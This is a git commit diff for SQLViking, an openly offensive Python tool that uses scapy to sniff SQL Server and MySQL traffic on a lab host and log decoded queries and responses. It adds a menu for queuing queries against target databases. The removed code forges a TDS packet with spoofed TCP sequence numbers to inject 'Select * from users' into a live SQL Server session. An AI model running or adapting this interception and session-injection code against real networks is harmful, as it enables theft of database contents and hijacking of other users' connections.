51c881f4750de5274252bd1d4bd6a2d1658f3924
jonn.callahan <jonathan.g.callahan.ctr@mail.mil>
2014-11-26 14:22:10 -0500

    renamed test.py to sqlviking.py

--- sqlviking.py
+++ sqlviking.py
@@ -1,37 +1,194 @@
 from scapy.all import *
+from Queue import Queue
+import sys, threading, time, pytds
 
-srcip="192.168.37.1"
-dstip="192.168.37.135"
-dstport=1433 #default sqlserver port
+pkts=Queue()
+queries=Queue()
 
-#must be dynamically generated via sniffing
-srcport=59275
-seqnum=703947055
-acknum=1177937577
+class Parse(threading.Thread):
+	#TODO: need to be able to set MTU from cmdline
+	def __init__(self,mtu=1500):
+		threading.Thread.__init__(self)
+		self.die = False
+		self.mtu = mtu
+		self.frag = {}
+		self.res = ''
 
-class TDSPacket:
-	type="01"
-	status="09"
-	channel="0000"
-	pktnum="01"
-	window="00"
-	totalhlength="16000000"
-	hlength="12000000"
-	htype="0200"
-	typevalue="0000000000000000"
-	outstandingreqs="01000000"
-	query=""
+	def run(self):
+		global pkts
+		while not self.die:
+			if not pkts.empty():
+				self.parse(pkts.get())
 
-	def __init__(self,query):
-		for x in query:
-			self.query+=x.encode("hex")+"00"
-		self.length='{:0>4}'.format(hex(len(query)*2+30)[2:])
-		self.data=self.type+self.status+self.length+self.channel+self.pktnum+self.window+self.totalhlength+self.hlength+self.htype+self.typevalue+self.outstandingreqs+self.query	
+	def parse(self,pkt):
+		#TODO: determining parser by port. need to account for DBs on non-standard ports.
+		if pkt[TCP].sport == 1433:
+			#reassesmble pkts if fragged
+			key='%s:%s'%(pkt[IP].dst,pkt[TCP].dport)
+			if len(str(pkt[IP])) == self.mtu:
+				try:
+					self.frag[key]+=str(pkt[TCP])[20:]
+				except KeyError:
+					self.frag[key]=str(pkt[TCP])[20:]
+			else:
+				try:
+					self.parseRespSQLServ(self.frag[key]+str(pkt[TCP])[20:])
+					del self.frag[key]
+				except KeyError:
+					self.parseRespSQLServ(str(pkt[TCP])[20:])
+		elif pkt[TCP].dport == 1433:
+			self.parseReqSQLServ(str(pkt[TCP]).encode('hex')[40:])
+		elif pkt[TCP].sport == 3306:
+			self.parseRespMySQL(str(pkt[TCP]).encode('hex')[40:])
+		elif pkt[TCP].dport == 3306:
+			self.parseReqMySQL(str(pkt[TCP]).encode('hex')[40:])
+
+	def validAscii(self,h):
+		if int(h,16)>31 and int(h,16)<127:
+			return True
+		return False
+
+	def readable(self,data):
+		a=""
+		#TODO: terrible code, find better way to iterate over 2 chars at a time
+		for i in range(0,len(data)/2):
+			if self.validAscii(data[i*2:i*2+2]):
+				a+=data[i*2:i*2+2].decode("hex")
+		return a
+
+	def parseReqMySQL(self,data):
+		self.logres("\n--MySQL Req--")
+		self.logres("\nRaw: %s\n"%data)
+		self.logres("\nASCII: %s\n"%self.readable(data))
+
+	def parseRespMySQL(self,data):
+		self.logres("\n--MySQL Resp--")
+		self.logres("\nRaw: %s\n"%data)
+		self.logres("\nASCII: %s\n"%self.readable(data))
+
+	def parseReqSQLServ(self,data):
+		self.logres("\n--SQLServ Req--\n%s\n"%self.readable(data))
+
+	def parseRespSQLServ(self,data):
+		#TODO: this is ghetto as shit. need to clean up pytds fork. also need to add ability to parse col names from query responses
+		resp=''
+		tdssock = pytds._TdsSocket(data)
+		try:
+			while True:
+				tdssock._main_session.find_result_or_done()
+		except:
+			pass
+
+		for a in tdssock._main_session.results:
+			resp+=str(a)+"\n"
+
+		try:
+			resp=tdssock._main_session.messages[0]['message']
+		except:
+			pass
+
+		if len(resp) == 0:
+			resp = 'error parsing response'
+		self.logres("--SQLServ Resp--\n%s"%resp)
+
+	def println(self):
+		print(self.res)
+		self.res=''
+
+	def writeln(self,path):
+		with file(path,'w') as f:
+			f.write(self.res)
+
+	def logres(self,s):
+		self.res+=s
+
+class Scout(threading.Thread):
+	def __init__(self):
+			threading.Thread.__init__(self)
+			self.die = False
+		
+	def run(self):
+		self.scout()
+
+	def scout(self):
+		while not self.die:
+			try:
+				sniff(prn=self.pushToQueue,filter="tcp and host 192.168.37.133",store=0,timeout=5)
+			except:
+				self.die = True
+
+	def pushToQueue(self,pkt):
+		global pkts
+		pkts.put(pkt)
+	
+class Pillage(threading.Thread):
+	def __init__(self):
+		threading.Thread.__init__(self)
+		self.die = False
+
+	def run(self):
+		global queries
+		while not self.die:
+			if not queries.empty():
+				q = queries.get()
+				print('[*] Executing query:\t%s'%q.split('||')[0])
+				print('[*] Targetting:\t%s'%q.split('||')[1])
+
+def writeResults(t):
+	print('[*] Enter filepath to write to:')
+	path = raw_input("> ")
+	t.writeln(path)	 
+
+def printResults():
+	print('[*] Results so far:')
 
 def pillage():
-	global dstip,srcip,dstport,srcport,seqnum,acknum
-	tdsdata=TDSPacket("Select * from users")
-	send(IP(dst=dstip,src=srcip)/TCP(flags="PA",dport=dstport,sport=srcport,seq=seqnum,ack=acknum)/tdsdata.data.decode("hex"))
+	global queries
+	print('[*] Enter query to execute:')
+	query = raw_input("> ")
+	print('[*] Enter IP:port to execute against:')
+	dst = raw_input("> ")
+	queries.put(query+"||"+dst)
 
+def parseInput(input,t):
+	if input == 'w':
+		writeResults(t)
+	elif input == 'p':
+		t.println()
+	elif input == 'r':
+		pillage()
+	elif input == 'q':
+		raise KeyboardInterrupt
+	else:
+		print('Unknown command entered')	
+
+def main():
+	#TODO: better menu. running counter of reqs/resps capped and DBs discovered.
+	print('==Welcome to SQLViking!==')
+
+	t1 = Scout()
+	t2 = Parse()
+	t3 = Pillage()
+	t1.start()
+	t2.start()
+	t3.start()
+	
+	while True:
+		print('\n\n[*] Menu Items:')
+		print('\tw - dump current results to file specified')
+		print('\tp - print current results to screen')
+		print('\tr - run a query against a specified DB')
+		print('\tq - quit')
+		try:
+			parseInput(raw_input("> "),t2)
+		except KeyboardInterrupt:
+			print('\n[!] Shutting down...')
+			t1.die = True
+			t2.die = True
+			t3.die = True
+			break
+		#TODO: cheap hack to make sure everything prints before reprinting menu. need better solution. using Queue()?		
+		time.sleep(1)
+	
 if __name__ == "__main__":
-	pillage()
+	main()
